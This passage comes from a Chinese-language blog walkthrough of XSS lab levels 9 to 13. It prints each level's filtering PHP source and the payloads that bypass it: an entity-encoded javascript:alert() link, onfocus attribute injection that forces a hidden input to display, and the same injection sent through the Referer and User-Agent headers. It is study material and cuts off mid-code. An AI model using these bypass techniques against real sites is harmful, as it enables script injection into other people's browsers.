class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>我们必须让输入包含 http:&#x2F;&#x2F;，否则不会把我们的输入插入到 href 中！  </p><p>这样的话，使用内联注释付 &#x2F;**&#x2F;,在sql中也常用作空格绕过<br>payload:  </p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这关的注入点在url上<br>看网上wp，有其他传参参数？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level10&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>“t_sort”就过滤了尖括号而已，还是上网找了答案：</p><p>playlaod:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>这样源码就变成了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此时的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新的type&#x3D;”text”就覆盖了原来的type，就能让输入框显示出来了  </p><p>隐藏的input标签可以插入type&#x3D;”text”显示 </p><p>ai的解释：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm">即使最终 <span class="hljs-type">DOM</span> 中有两个 <span class="hljs-keyword">type</span>，但只要浏览器曾经把它当作 text 处理，它就可能：<br><br>在页面上占据空间<br>可以获得焦点<br>可以触发 onfocus<br>而 onfocus 事件不依赖 <span class="hljs-keyword">type</span> 最终值，只要元素能获得焦点即可。<br></code></pre></td></tr></table></figure><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>先看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level11&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>看到$str和$str00都会被转义，但http报头会被引用？<br>那注入点就是在报头了，和ai沟通一波，<br>最后再把上一题的payload拿来用，在http报头加上payload:  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Referer</span>: &#x27;<span class="hljs-string">&quot; onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>依旧先偷看一眼源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level12&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html<br></code></pre></td></tr></table></figure><p>依旧报头注入，这次变成USER_AGENT了<br>也是直接拿上题payload来用：  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/level12.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27;&quot; onfocus=&quot;alert(1)&quot; type=&quot;text&quot; &quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>进页面先有个php语法报错：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;    